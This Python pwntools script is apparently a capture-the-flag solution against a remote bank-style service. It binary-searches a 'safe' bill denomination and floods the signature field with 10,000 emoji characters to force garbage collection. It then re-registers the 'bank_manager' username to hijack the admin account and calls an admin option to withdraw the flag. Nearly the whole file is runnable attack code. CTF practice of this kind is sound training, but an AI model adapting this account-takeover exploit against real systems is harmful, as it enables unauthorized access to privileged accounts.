from dotenv import load_dotenv
from pwn import *
import time
import re
import os

load_dotenv()

HOST = os.environ.get("HOST", "")
PORT = 9005
TICKET = os.environ.get("TICKET", "")

REG_PROMPT = b"Please register with a username (or type 'exit' to quit):"
MENU_PROMPT = b"Choose an operation"


def wait_if_rate_limited(p, banner):
    # banner内に "Slow down! Come back in n seconds" が含まれていたら待機
    m = re.search(rb"Come back in (\d+) seconds", banner)
    if m:
        wait_time = int(m.group(1))
        log.info("Received rate limit, waiting {} seconds".format(wait_time))
        time.sleep(wait_time)
        return True
    return False


def test_denomination(d):
    success_count = 0
    attempts = 0
    max_attempts = 3  # Maximum trials before giving up
    while attempts < max_attempts and success_count < 2:
        attempts += 1
        try:
            p = remote(HOST, PORT)
            p.sendlineafter(b"Ticket please:", TICKET.encode())
            banner = p.recvline(timeout=1)
            if wait_if_rate_limited(p, banner):
                p.close()
                continue  # Skip retry count increment for rate limiting
            p.sendlineafter(REG_PROMPT, b"random")
            p.sendlineafter(MENU_PROMPT, b"3")  # Set signature
            p.sendlineafter(
                b"Enter your signature (will be used on bills):",
                ("⏰" * 10000).encode(),
            )
            p.sendlineafter(MENU_PROMPT, b"2")  # Withdraw tokens
            p.sendlineafter(b"Enter amount to withdraw:", b"1")
            p.sendlineafter(b"Enter bill denomination:", str(d).encode())
            data = p.recvline(timeout=2)
            p.close()
            if b"Killed" in data:
                return False
            # If this attempt succeeded, increment counter
            success_count += 1
        except Exception:
            return False
    return success_count >= 2


def find_safe_denomination():
    low = 1e-10
    high = 1.0
    safe_value = None
    count = 10
    for i in range(count):
        mid = (low + high) / 2
        log.info("Testing candidate [{}/{}]: {}".format(i + 1, count, mid))
        if test_denomination(mid):
            log.info("[safe] {}".format(mid))
            safe_value = mid
            high = mid
        else:
            log.warn("[unsafe] {}".format(mid))
            low = mid
    return safe_value


def main():
    # First determine a safe bill denomination using binary search
    safe_denom = find_safe_denomination()
    if safe_denom is None:
        log.error("Could not find a safe denomination!")
        return
    log.success("Found safe bill denomination: {}".format(safe_denom))

    # Use a loop to reconnect every time a process kill is detected.
    while True:
        try:
            p = remote(HOST, PORT)
            p.sendlineafter(b"Ticket please:", TICKET.encode())
            banner = p.recvline(timeout=2)
            if wait_if_rate_limited(p, banner):
                p.close()
                continue

            log.info("Spamming bill to trigger garbage collection ...")
            p.sendlineafter(REG_PROMPT, b"random")
            p.sendlineafter(MENU_PROMPT, b"3")  # Set signature
            p.sendlineafter(
                b"Enter your signature (will be used on bills):",
                ("⏰" * 10000).encode(),
            )
            p.sendlineafter(MENU_PROMPT, b"2")  # Withdraw tokens
            p.sendlineafter(b"Enter amount to withdraw:", b"1")
            p.sendlineafter(b"Enter bill denomination:", str(safe_denom).encode())

            data = p.recvline(timeout=1)
            if b"Killed" in data:
                raise Exception("Process killed during withdrawal")
            p.sendlineafter(MENU_PROMPT, b"4")  # Log out

            log.info("Withdraw successful")
            break  # Exit loop if successful
        except Exception as e:
            log.warning(
                "Process killed or rate-limited, reconnecting... ({})".format(e)
            )
            continue

    log.info("Trying to hijack 'bank_manager' account ...")
    p.sendlineafter(REG_PROMPT, b"bank_manager")
    data = p.recvline(timeout=3)
    if b"already exists" in data:
        log.error("Could not hijack 'bank_manager' (user already exists)")
        return

    log.success("Hijacked 'bank_manager' account!")
    p.sendlineafter(REG_PROMPT, b"bank_manager")

    log.info("Triggering admin operation to withdraw flag ...")
    p.sendlineafter(MENU_PROMPT, b"6")
    p.interactive()


if __name__ == "__main__":
    main()
